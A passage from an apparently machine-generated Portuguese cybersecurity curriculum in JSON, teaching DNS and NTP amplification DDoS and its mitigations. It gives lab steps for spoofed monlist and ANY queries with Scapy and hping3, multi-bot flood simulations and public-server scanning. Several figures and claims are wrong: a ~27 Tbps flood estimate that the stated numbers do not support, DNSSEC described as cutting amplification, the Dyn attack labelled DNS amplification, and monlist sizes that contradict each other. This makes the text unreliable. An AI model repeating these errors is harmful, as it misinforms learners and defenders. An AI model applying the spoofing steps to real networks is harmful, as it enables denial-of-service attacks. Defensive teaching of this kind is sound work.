                                    "Dados de tamanhos do Step 2",
                                    "Fórmula anotada"
                                  ],
                                  "tips": "Sempre use bytes totais do pacote UDP para precisão, não só payload DNS.",
                                  "learningObjective": "Executar cálculos precisos do fator de amplificação.",
                                  "commonMistakes": [
                                    "Dividir incorretamente (query/resposta)",
                                    "Ignorar overhead de headers"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impacto no Contexto de DDoS",
                                  "subSteps": [
                                    "Simule: 1000 bots enviando 60-byte queries = 60KB; respostas = 4MB flood.",
                                    "Calcule ganho total: Fator x número de bots x taxa de queries.",
                                    "Discuta mitigações: Rate limiting, BCP 38, validação de resposta.",
                                    "Pesquise caso real (ex: ataque Memcached ou DNS em 2016).",
                                    "Escreva relatório resumindo risco."
                                  ],
                                  "verification": "Descreva como um fator de 66x transforma 1Gbps em 66Gbps de ataque.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Relatórios de ataques DDoS (ex: Cloudflare blog)",
                                    "Calculadora para simulações"
                                  ],
                                  "tips": "Pense em escala: pequenos pacotes viram tsunamis de tráfego.",
                                  "learningObjective": "Interpretar fator de amplificação em cenários de ataque reais.",
                                  "commonMistakes": [
                                    "Subestimar escala com poucos bots",
                                    "Confundir com outros vetores de amplificação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um teste: Envie query DNS spoofada de 60 bytes (UDP+DNS header mínimo) para tipo ANY em servidor vulnerável, recebendo 4096 bytes de resposta. Fator = 4096 / 60 ≈ 68.27x. Com 10.000 bots a 10 queries/seg, gera ~27Tbps de flood na vítima.",
                              "finalVerifications": [
                                "Calcula corretamente fator para query 60B e resposta 4000B.",
                                "Explica papel do spoofing IP na reflexão.",
                                "Identifica queries amplificadoras (ANY, CHAOS).",
                                "Simula impacto de DDoS com fator aplicado.",
                                "Lista 2 mitigações específicas para DNS amp.",
                                "Compara com outros amplificadores (NTP, SSDP)."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos tamanhos de pacotes (±10 bytes).",
                                "Cálculo matemático correto (erro <1%).",
                                "Explicação clara do mecanismo de amplificação.",
                                "Análise contextualizada de impacto em DDoS.",
                                "Uso de exemplos reais ou simulados.",
                                "Identificação de erros comuns e mitigações."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Cálculo de razões e proporções em redes.",
                                "Redes de Computadores: Protocolos UDP/DNS e captura de pacotes.",
                                "Ética e Direito: Implicações legais de simulações de ataques.",
                                "Estatística: Modelagem de tráfego em escala DDoS.",
                                "Física: Analogia de alavancagem/amplificação de força."
                              ],
                              "realWorldApplication": "Usado em ataques DDoS massivos como o de 2016 contra Dyn (1.2Tbps via DNS amp) e Mirai botnet, permitindo atacantes com banda limitada sobrecarregarem infraestruturas críticas como bancos e governos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.3",
                            "name": "Identificar mitigações para amplificação DNS",
                            "description": "Discutir técnicas como rate limiting em resolvers DNS, bloqueio de consultas recursivas de IPs externos e uso de DNSSEC para validar consultas e prevenir spoofing.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o mecanismo de amplificação DNS",
                                  "subSteps": [
                                    "Estudar o protocolo DNS básico, focando em consultas recursivas e iterativas.",
                                    "Analisar como atacantes enviam consultas falsificadas com IP da vítima como origem.",
                                    "Examinar exemplos de registros DNS que geram respostas amplificadas (ex: ANY query).",
                                    "Identificar o papel do resolver recursivo na amplificação.",
                                    "Mapear o fluxo completo de um ataque de amplificação DNS."
                                  ],
                                  "verification": "Criar um diagrama ilustrando o fluxo de um ataque de amplificação DNS, destacando pontos de exploração.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 1035 (DNS Protocol)",
                                    "Artigos sobre DNS Amplification Attacks (ex: Cloudflare Learning)",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Use analogias como 'um megafone para tráfego' para visualizar a amplificação.",
                                  "learningObjective": "Dominar os fundamentos do ataque para identificar vulnerabilidades específicas.",
                                  "commonMistakes": [
                                    "Confundir reflexão com amplificação",
                                    "Ignorar o fator de amplificação (tipicamente 50x ou mais)",
                                    "Subestimar o papel do spoofing de IP de origem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Rate Limiting em Resolvers DNS",
                                  "subSteps": [
                                    "Configurar limites de taxa por IP de origem em servidores como BIND ou Unbound.",
                                    "Definir thresholds realistas (ex: 100 consultas/segundo por IP).",
                                    "Testar rate limiting com ferramentas como dnsperf ou script de flood simulado.",
                                    "Monitorar logs para ajustar limites dinamicamente.",
                                    "Integrar com ferramentas de firewall como iptables para reforço."
                                  ],
                                  "verification": "Simular tráfego excessivo e confirmar que consultas acima do limite são rejeitadas via logs.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Servidor DNS local (BIND/Unbound)",
                                    "dnsperf ou hping3 para testes",
                                    "Documentação BIND Rate Limiting"
                                  ],
                                  "tips": "Comece com limites conservadores para evitar bloqueios legítimos durante testes.",
                                  "learningObjective": "Aprender a limitar abusos de recursão para reduzir fator de amplificação.",
                                  "commonMistakes": [
                                    "Definir limites muito baixos impactando usuários legítimos",
                                    "Não considerar bursts de tráfego normal",
                                    "Esquecer de logar eventos para análise"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Bloquear Consultas Recursivas de IPs Externos",
                                  "subSteps": [
                                    "Configurar ACLs (Access Control Lists) no resolver DNS para permitir recursão apenas de IPs internos.",
                                    "Implementar regras em BIND (allow-recursion) ou PowerDNS.",
                                    "Verificar configuração com dig queries de IPs internos e externos.",
                                    "Reforçar com BGP anycast ou firewall edge para bloquear recursão global.",
                                    "Auditar configuração para exceções seguras (ex: VPNs)."
                                  ],
                                  "verification": "Executar consultas recursivas de um IP externo e confirmar rejeição (REFUSED).",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Servidor DNS configurável",
                                    "Ferramenta dig ou nslookup",
                                    "Documentação BIND ACLs"
                                  ],
                                  "tips": "Use zonas de resposta autoritativa para externos, recursiva só para internos.",
                                  "learningObjective": "Prevenir exploração de resolvers públicos por atacantes remotos.",
                                  "commonMistakes": [
                                    "Bloquear acidentalmente clientes legítimos remotos",
                                    "Não testar de múltiplas redes",
                                    "Ignorar configurações de forwarders"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adotar DNSSEC para Validação e Prevenção de Spoofing",
                                  "subSteps": [
                                    "Entender chaves DS, RRSIG e validação de cadeia de confiança DNSSEC.",
                                    "Habilitar DNSSEC no resolver (ex: validate-except em BIND).",
                                    "Gerar e assinar zona com ferramentas como dnssec-keygen.",
                                    "Testar validação com dig +dnssec e ferramentas como dnsviz.net.",
                                    "Analisar como DNSSEC mitiga spoofing em amplificações."
                                  ],
                                  "verification": "Validar uma zona DNSSEC assinada e confirmar falha em consultas spoofadas.",
                                  "estimatedTime": "70 minutos",
                                  "materials": [
                                    "BIND com DNSSEC habilitado",
                                    "dnssec-keygen e dnsviz.net",
                                    "RFC 4033-4035 (DNSSEC)"
                                  ],
                                  "tips": "Inicie com validação negativa para desempenho; monitore overhead criptográfico.",
                                  "learningObjective": "Usar autenticação para invalidar consultas falsificadas em ataques.",
                                  "commonMistakes": [
                                    "Erros na cadeia de confiança DS",
                                    "Overhead de performance não otimizado",
                                    "Confundir validação com criptografia de tráfego (DNS over TLS)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório com servidor web vítima, simule um ataque DNS amplification usando Spoofed UDP packets com dig para ANY query em zona grande; aplique rate limiting (100 qps/IP), bloqueie recursão externa via ACL e habilite DNSSEC na zona atacada, medindo redução no tráfego amplificado de >50x para <5x.",
                              "finalVerifications": [
                                "Explicar com precisão como cada mitigação reduz o fator de amplificação.",
                                "Configurar um resolver DNS com todas as três mitigações em ambiente simulado.",
                                "Identificar cenários onde uma mitigação sozinha falha e por quê.",
                                "Analisar logs de um teste de ataque mitigado.",
                                "Propor combinação otimizada para diferentes tipos de rede (ISP vs Enterprise).",
                                "Desenhar diagrama comparando antes/depois das mitigações."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nas descrições de rate limiting, bloqueio recursivo e DNSSEC.",
                                "Capacidade de implementação prática sem erros de configuração.",
                                "Análise quantitativa do impacto (ex: redução de fator de amplificação).",
                                "Identificação correta de limitações e complementos entre mitigações.",
                                "Clareza na comunicação de conceitos via diagramas ou relatórios.",
                                "Criatividade em cenários de teste realistas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP/DNS e roteamento BGP.",
                                "Criptografia: Assinaturas digitais e validação de cadeia de confiança.",
                                "Segurança de Sistemas: Defesas contra DDoS e análise de logs.",
                                "Administração de Sistemas: Configuração de servidores BIND/Unbound.",
                                "Análise de Dados: Monitoramento e métricas de tráfego de rede."
                              ],
                              "realWorldApplication": "Durante o ataque DDoS de 2016 contra Dyn (impactando Twitter e Netflix), ISPs como Cloudflare implementaram rate limiting e bloqueio recursivo em resolvers, combinado com DNSSEC parcial, reduzindo picos de 1.2 Tbps; hoje, CDNs usam essas mitigações proativamente contra botnets como Mirai."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.3",
                        "name": "Amplificação NTP",
                        "description": "Exploração de servidores NTP (Network Time Protocol) desconfigurados para amplificar tráfego, utilizando comandos como 'monlist' que retornam listas extensas de clientes recentes, gerando respostas massivas.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.3.1",
                            "name": "Explicar o comando monlist em NTP",
                            "description": "Detalhar como o comando monlist em servidores NTP vulneráveis retorna até 600 entradas de clientes recentes (cerca de 250-500 bytes por resposta), permitindo amplificação de até 200x a partir de uma pequena requisição spoofada.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Protocolo NTP e o Comando monlist",
                                  "subSteps": [
                                    "Pesquise o que é o Network Time Protocol (NTP) e seu propósito principal de sincronização de tempo.",
                                    "Identifique os comandos de controle do NTP, como os suportados pelo ntpd (daemon NTP).",
                                    "Localize documentação oficial sobre o comando 'monlist' em versões antigas do NTP (até 4.2.8).",
                                    "Anote que monlist é um comando de monitoramento que lista clientes recentes.",
                                    "Compare monlist com comandos semelhantes como 'mrulist' ou 'peers'."
                                  ],
                                  "verification": "Resuma em uma frase o propósito do NTP e o que monlist faz, sem consultar fontes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação NTP oficial (ntp.org), Wireshark para captura de pacotes"
                                  ],
                                  "tips": "Foquem em versões vulneráveis (pré-4.2.8p1); leia o código fonte se possível via GitHub.",
                                  "learningObjective": "Compreender o contexto e função básica do comando monlist no NTP.",
                                  "commonMistakes": [
                                    "Confundir monlist com ntpq (ferramenta cliente), ignorar que é um comando interno do ntpd."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Estrutura e Tamanho da Resposta monlist",
                                  "subSteps": [
                                    "Execute ou simule uma requisição monlist usando ntpdc em um servidor NTP vulnerável (use labs como TryHackMe).",
                                    "Capture a resposta com Wireshark e conte o número de entradas (até 600).",
                                    "Meça o tamanho da resposta: aproximadamente 250-500 bytes por entrada, totalizando até 300KB.",
                                    "Identifique os campos na resposta: IP origem, modo, stratum, etc., para cada cliente recente.",
                                    "Calcule o fator de amplificação: compare tamanho da requisição (~50 bytes) com resposta."
                                  ],
                                  "verification": "Capture e descreva uma resposta monlist real ou simulada, listando pelo menos 3 campos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ntpdc ferramenta, Wireshark, servidor NTP vulnerável em VM (ex: NTP 4.2.6)"
                                  ],
                                  "tips": "Use 'ntpdc -c monlist <IP>' em ambiente controlado; filtre pacotes UDP porta 123.",
                                  "learningObjective": "Detalhar o conteúdo e tamanho da resposta monlist para entender potencial de amplificação.",
                                  "commonMistakes": [
                                    "Subestimar o número de entradas (não 600), ignorar overhead UDP/IP."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Mecanismo de Amplificação via Spoofing",
                                  "subSteps": [
                                    "Explique como spoofing de IP fonte transforma reflexão em amplificação DDoS.",
                                    "Simule uma requisição pequena spoofada (fonte IP = vítima) para servidor NTP público vulnerável.",
                                    "Observe como o servidor responde diretamente à vítima com dados amplificados (200x).",
                                    "Calcule amplificação: requisição 50-100 bytes → resposta 100-300KB.",
                                    "Teste em lab: use Scapy para craftar pacote NTP monlist spoofado."
                                  ],
                                  "verification": "Crie um script Scapy simples que envie monlist spoofado e capture resposta amplificada.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Scapy (Python), hping3 ou Scapy para spoofing, servidor NTP vulnerável"
                                  ],
                                  "tips": "Em labs, use --src-ip em hping3; evite produção para não violar leis.",
                                  "learningObjective": "Dominar como monlist é abusado em ataques de reflexão/amplificação DDoS.",
                                  "commonMistakes": [
                                    "Confundir reflexão com amplificação, não spoofar corretamente o IP fonte."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Mitigações e Verificar Compreensão",
                                  "subSteps": [
                                    "Pesquise patches NTP: desabilitação de monlist pós-4.2.8p1, rate limiting.",
                                    "Verifique servidores públicos com zmap ou nmap para monlist (script NSE).",
                                    "Discuta RFC 5905 e melhores práticas: restrinja queries de controle.",
                                    "Compare com outros vetores NTP como 'ntpdc reslist'.",
                                    "Documente um relatório de vulnerabilidade simulada."
                                  ],
                                  "verification": "Explique 3 mitigações e escaneie um servidor para confirmar se monlist está exposto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Nmap com script ntp-monlist, RFC 5905 PDF"
                                  ],
                                  "tips": "Use 'nmap --script ntp-monlist -p123 <IP>'; priorize labs éticos.",
                                  "learningObjective": "Aplicar conhecimento para detecção e prevenção de abusos monlist.",
                                  "commonMistakes": [
                                    "Achar que todos NTP são vulneráveis, ignorar configurações modernas como 'disable monitor'."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um ataque DDoS real de 2014 (CloudFlare), atacantes spoofaram milhões de requisições monlist para servidores NTP públicos, gerando 400 Gbps de tráfego amplificado para vítimas, com cada requisição de 64 bytes produzindo respostas de até 300KB.",
                              "finalVerifications": [
                                "Descreva precisamente o que o comando monlist retorna e seu tamanho típico.",
                                "Calcule o fator de amplificação para uma resposta de 600 entradas.",
                                "Explique o papel do spoofing IP na amplificação.",
                                "Identifique pelo menos 2 mitigações para servidores NTP.",
                                "Capture e analise uma resposta monlist em Wireshark.",
                                "Diferencie monlist de outros comandos NTP como peers ou ntpq."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição da resposta monlist (número de entradas, tamanho).",
                                "Compreensão clara do mecanismo de spoofing e amplificação (fator 200x).",
                                "Capacidade de simular/demonstrar em lab com ferramentas como Scapy/Wireshark.",
                                "Identificação correta de vulnerabilidades e mitigações.",
                                "Explicação fluida sem erros comuns (ex: confusão com outros protocolos).",
                                "Relatório ou diagrama visual do fluxo de ataque."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos UDP, spoofing IP (ICMP, DNS amp).",
                                "Programação: Análise de pacotes com Scapy/Python.",
                                "Cibersegurança: DDoS mitigation, scanning com Nmap.",
                                "Sistemas Operacionais: Configuração de daemons NTP em Linux.",
                                "Matemática: Cálculo de amplificação (taxas de bytes)."
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam esse conhecimento para auditar servidores NTP em redes corporativas, escanear internet por vetores de amplificação (ex: Project Sonar), e configurar firewalls para bloquear queries monlist, prevenindo participação involuntária em DDoS."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.2",
                            "name": "Analisar vulnerabilidades em servidores NTP",
                            "description": "Identificar configurações padrão inseguras em implementações NTP antigas que expõem comandos de amplificação e como bots infectados em botnets exploram esses servidores em massa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Protocolo NTP e Comandos Vulneráveis",
                                  "subSteps": [
                                    "Estude a arquitetura do NTP (Network Time Protocol) e seu papel na sincronização de tempo.",
                                    "Identifique comandos NTP específicos como 'monlist', 'ntpdc -c monlist' e 'mrulist' que revelam listas de clientes.",
                                    "Analise como esses comandos respondem com pacotes grandes (até 600x amplificação).",
                                    "Revise RFCs relevantes (ex: RFC 5905) para configurações padrão em versões antigas (NTP < 4.2.8).",
                                    "Compare NTP seguro vs. inseguro usando diagramas de fluxo."
                                  ],
                                  "verification": "Resuma em um diagrama os comandos vulneráveis e seu tamanho de resposta vs. requisição.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Documentação NTP oficial",
                                    "RFC 5905 e 8635",
                                    "Ferramenta Wireshark para captura inicial"
                                  ],
                                  "tips": "Use Wireshark para visualizar tráfego NTP real de servidores públicos.",
                                  "learningObjective": "Explicar como comandos NTP expõem dados para amplificação.",
                                  "commonMistakes": [
                                    "Confundir NTP com DNS para amplificação",
                                    "Ignorar versões específicas afetadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Configurações Padrão Inseguras em Servidores NTP",
                                  "subSteps": [
                                    "Instale uma versão vulnerável de NTP (ex: 4.2.6p5) em um ambiente virtualizado como VirtualBox ou Docker.",
                                    "Examine o arquivo de configuração ntpd.conf padrão e identifique opções como 'restrict default noquery' ausentes.",
                                    "Use nmap ou ntpdc para escanear portas 123/UDP e testar comandos remotos.",
                                    "Documente configurações inseguras: enable monitor, falta de autenticação.",
                                    "Compare com configurações seguras em NTP moderno."
                                  ],
                                  "verification": "Gere um relatório listando 5 configurações inseguras detectadas no seu lab.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "VM com Ubuntu 14.04",
                                    "NTP 4.2.6p5 pacote",
                                    "Nmap, ntpdc ferramentas"
                                  ],
                                  "tips": "Isole o lab em rede privada para evitar exposição real.",
                                  "learningObjective": "Detectar e listar configurações NTP que permitem queries de amplificação.",
                                  "commonMistakes": [
                                    "Executar em rede pública",
                                    "Não versionar corretamente o NTP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Exploração por Bots em Botnets",
                                  "subSteps": [
                                    "Configure um servidor NTP vulnerável e um 'bot' simulado usando Scapy ou hping3.",
                                    "Envie requests de amplificação spoofadas (ex: IP vítima no source).",
                                    "Capture tráfego com Wireshark para medir fator de amplificação (queries pequenas -> responses grandes para vítima).",
                                    "Simule escala: rode múltiplos bots para flood demonstrando DDoS.",
                                    "Analise logs do servidor NTP para padrões de abuso."
                                  ],
                                  "verification": "Demonstre amplificação >100x em captura Wireshark com IP spoofado.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Wireshark",
                                    "Scapy ou hping3",
                                    "Script Python para spoofing UDP"
                                  ],
                                  "tips": "Use tcpreplay para repetir capturas e escalar simulação.",
                                  "learningObjective": "Reproduzir exploração NTP em botnet para entender reflexão em massa.",
                                  "commonMistakes": [
                                    "Spoofing incorreto de IP",
                                    "Não medir amplificação precisamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impacto e Mitigações em Ataques DDoS",
                                  "subSteps": [
                                    "Revise casos reais como ataque NTP de 2014 (400 Gbps).",
                                    "Meça impacto: latência, perda de pacotes na vítima simulada.",
                                    "Teste mitigações: disable monlist, restrict noquery, rate limiting.",
                                    "Crie um checklist para auditoria de servidores NTP públicos.",
                                    "Documente lições para prevenção em produção."
                                  ],
                                  "verification": "Aplique mitigações e confirme que amplificação foi bloqueada via teste.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Casos de estudo DDoS (ex: Arbor Networks reports)",
                                    "ntp.conf templates seguros"
                                  ],
                                  "tips": "Audite servidores públicos com zmap para prática ética.",
                                  "learningObjective": "Avaliar impacto de vulnerabilidades NTP e propor defesas.",
                                  "commonMistakes": [
                                    "Ignorar autenticação NTP",
                                    "Não testar pós-mitigação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab Docker, configure ntpd 4.2.6p5 sem 'restrict noquery'. Use Scapy para spoofar 100 requests monlist de IPs bots para uma vítima simulada, resultando em 20k pacotes amplificados (300x), derrubando o serviço da vítima como em botnets Mirai.",
                              "finalVerifications": [
                                "Lista comandos NTP vulneráveis e fatores de amplificação.",
                                "Configura e audita servidor NTP inseguro em lab.",
                                "Simula ataque de reflexão com Wireshark proof.",
                                "Aplica mitigações e verifica bloqueio.",
                                "Explica exploração botnet em relatório.",
                                "Identifica 3 casos reais de DDoS NTP."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de comandos (monlist, etc.) e versões afetadas.",
                                "Qualidade da simulação: fator amplificação medido >100x.",
                                "Relatório completo com capturas Wireshark e logs.",
                                "Aplicação correta de mitigações com verificação.",
                                "Análise de impacto quantitativa (Gbps potenciais).",
                                "Conexão clara com botnets e DDoS reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos UDP e spoofing IP.",
                                "Programação: Scripts Python/Scapy para simulação de ataques.",
                                "Sistemas Operacionais: Configuração e hardening de serviços Linux.",
                                "Ética em Cibersegurança: Práticas de lab isolado e auditoria responsável.",
                                "Matemática: Cálculo de fatores de amplificação e escalabilidade DDoS."
                              ],
                              "realWorldApplication": "Auditar infraestruturas corporativas para servidores NTP expostos, prevenindo participação involuntária em DDoS como os de 2013-2014 que atingiram provedores como Cloudflare, ou defender contra botnets atuais explorando IoT infectado."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.3",
                            "name": "Aplicar defesas contra amplificação NTP",
                            "description": "Descrever atualizações NTP para desabilitar monlist, implementação de filtros BCP-38 em roteadores para prevenir spoofing IP e monitoramento de tráfego UDP na porta 123.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Atualizar e Configurar Servidor NTP para Desabilitar Monlist",
                                  "subSteps": [
                                    "Instale ou atualize o daemon NTP (ntpd) para versão 4.2.8 ou superior usando gerenciadores de pacotes (apt/yum).",
                                    "Edite o arquivo de configuração /etc/ntp.conf e adicione 'noquery' ou restrinja comandos de controle com 'restrict default noquery'.",
                                    "Reinicie o serviço NTP com 'systemctl restart ntp' e verifique logs em /var/log/ntp.log.",
                                    "Teste localmente com 'ntpdc -c monlist' para confirmar que o comando é rejeitado.",
                                    "Aplique configurações de rate-limiting para queries públicas adicionando 'discard minimum 1 default 1 ms 1 128ms 2 1024ms 3'."
                                  ],
                                  "verification": "Execute 'ntpdc -c monlist' remotamente e confirme erro 'noquery' ou 'access denied'; verifique logs sem entradas de amplificação.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Servidor Linux com NTP instalado",
                                    "Acesso root/sudo",
                                    "Documentação NTP.org sobre configurações seguras"
                                  ],
                                  "tips": "Sempre faça backup do ntp.conf antes de editar; use 'ntpq -p' para monitorar peers.",
                                  "learningObjective": "Configurar NTP para prevenir abuso de comandos de amplificação como monlist.",
                                  "commonMistakes": [
                                    "Esquecer de reiniciar o serviço após edição",
                                    "Não restringir fontes externas com 'restrict' adequadamente",
                                    "Usar versões antigas vulneráveis do NTP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Filtros BCP-38 em Roteadores para Prevenir Spoofing IP",
                                  "subSteps": [
                                    "Identifique interfaces de entrada/saída no roteador (ex: Cisco IOS com 'show ip interface').",
                                    "Configure ACLs uRPF (Unicast Reverse Path Forwarding) com 'ip verify unicast source reachable-via rx allow-default'.",
                                    "Para egress filtering, crie ACL bloqueando IPs source inválidos: 'access-list 101 deny ip 192.168.0.0 0.0.255.255 any' e aplique em interfaces.",
                                    "Ative BCP-38 estritamente com 'ip options drop' para pacotes com IP options inválidos.",
                                    "Salve configuração com 'write memory' e teste com ferramentas como hping3 para simular spoofing."
                                  ],
                                  "verification": "Use 'hping3 --spoof <IP inválido> -2 -p 123 <seu roteador>' e confirme pacotes dropados nos counters da ACL.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Roteador Cisco/Juniper com acesso CLI",
                                    "Guia BCP-38 RFC 2827",
                                    "Ferramenta hping3 ou Scapy para testes"
                                  ],
                                  "tips": "Comece com filtros loose uRPF em produção para evitar falsos positivos; monitore drops com SNMP.",
                                  "learningObjective": "Aplicar filtros anti-spoofing para bloquear pacotes NTP falsificados na origem.",
                                  "commonMistakes": [
                                    "ACLs invertidas (permitindo spoofing)",
                                    "Não aplicar em todas as interfaces de borda",
                                    "Ignorar filtering de egress em ASNs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Monitoramento de Tráfego UDP na Porta 123",
                                  "subSteps": [
                                    "Instale ferramentas como tcpdump, Wireshark ou nfstream em hosts/roteadores.",
                                    "Configure alertas com Prometheus + Grafana ou ELK Stack para tráfego UDP/123 acima de threshold (ex: >1k pacotes/seg).",
                                    "Crie regras no firewall (iptables/ufw) para log: 'iptables -A INPUT -p udp --dport 123 -j LOG --log-prefix \"NTP_AMPLIFY:\"'.",
                                    "Integre com SIEM (Splunk/ELK) para correlação de eventos de amplificação.",
                                    "Defina baselines de tráfego NTP normal e configure anomaly detection."
                                  ],
                                  "verification": "Gere tráfego simulado com 'ntpdate -q pool.ntp.org' e confirme logs/alertas sem falsos negativos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de monitoramento (tcpdump, Wireshark)",
                                    "Servidor com Prometheus/Grafana",
                                    "Documentação NetFlow/sFlow"
                                  ],
                                  "tips": "Use NetFlow em roteadores para escalabilidade; filtre por bytes/pacotes para detectar amplificação (ratio >10:1).",
                                  "learningObjective": "Detectar e responder a tentativas de amplificação NTP em tempo real.",
                                  "commonMistakes": [
                                    "Thresholds muito baixos causando alertas falsos",
                                    "Não correlacionar com logs de NTP",
                                    "Monitorar apenas volume, ignorando ratios de amplificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar as Defesas Implementadas",
                                  "subSteps": [
                                    "Simule ataque NTP amplification com ferramentas como 'ntp_amp' ou Scapy scripts spoofing UDP/123.",
                                    "Verifique métricas: zero respostas amplificadas, filtros bloqueando >99% spoofed.",
                                    "Execute scans públicos como 'nmap -sU --script ntp-monlist <IP>' para confirmar exposição zero.",
                                    "Documente resultados em relatório com capturas de tráfego e configurações.",
                                    "Atualize políticas de segurança baseadas em lições aprendidas."
                                  ],
                                  "verification": "Nenhum pacote amplificado sai da rede durante simulação; ferramentas de scan reportam 'closed' ou 'filtered'.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Scripts de teste Scapy/hping3",
                                    "Ambiente lab isolado (GNS3/EVE-NG)",
                                    "Ferramentas de scan como nmap"
                                  ],
                                  "tips": "Teste em lab primeiro; use VPN para scans públicos sem expor produção.",
                                  "learningObjective": "Validar efetividade das defesas contra vetores reais de amplificação NTP.",
                                  "commonMistakes": [
                                    "Testes insuficientes sem simulação realista",
                                    "Ignorar validação pós-implantação",
                                    "Não documentar para auditorias"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com GNS3, configure um servidor NTP vulnerável, aplique as defesas (desabilite monlist, BCP-38 em roteador virtual, monitore com Wireshark), simule ataque de 1000 pacotes spoofed/seg e confirme drop de 100% das respostas amplificadas.",
                              "finalVerifications": [
                                "Comando monlist retorna erro em queries remotas",
                                "Filtros BCP-38 bloqueiam pacotes com IP source inválido",
                                "Monitoramento detecta picos UDP/123 com alertas em <5min",
                                "Simulação de ataque mostra ratio de amplificação <1:1",
                                "Scan público nmap confirma porta 123 não amplificável",
                                "Logs sem evidências de abuso NTP nos últimos 7 dias"
                              ],
                              "assessmentCriteria": [
                                "Configurações NTP com 'noquery' e rate-limits aplicadas corretamente (100%)",
                                "ACLs BCP-38 cobrindo todas interfaces de borda sem falsos positivos",
                                "Sistema de monitoramento com thresholds configurados e testados",
                                "Testes de validação documentados com evidências (capturas/logs)",
                                "Tempo total de resposta a simulação <10min",
                                "Conhecimento demonstrado em quiz sobre RFCs NTP/BCP-38"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos UDP/IP e roteamento (uRPF)",
                                "Administração de Sistemas: Configuração de serviços Linux/ntpd",
                                "Análise de Dados: Monitoramento com Grafana/Prometheus",
                                "Ética em Cibersegurança: Responsabilidade em mitigar DDoS",
                                "Programação: Scripts Scapy para automação de testes"
                              ],
                              "realWorldApplication": "Proteger infraestrutura crítica (bancos, hospitais) contra ataques DDoS NTP que amplificam tráfego em 200x, como o incidente de 2014 que derrubou redes europeias, garantindo continuidade de serviços de tempo preciso para autenticação e sincronização."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.4",
                    "name": "Uso de Botnets em DDoS",
                    "description": "Estrutura e operação de redes de bots para coordenar ataques distribuídos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.4.1",
                        "name": "Estrutura de uma Botnet",
                        "description": "Componentes principais de uma botnet, incluindo bots zumbis, servidores de comando e controle (C&C) e arquitetura geral para coordenação distribuída em ataques DDoS.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.1.1",
                            "name": "Identificar componentes de uma botnet",
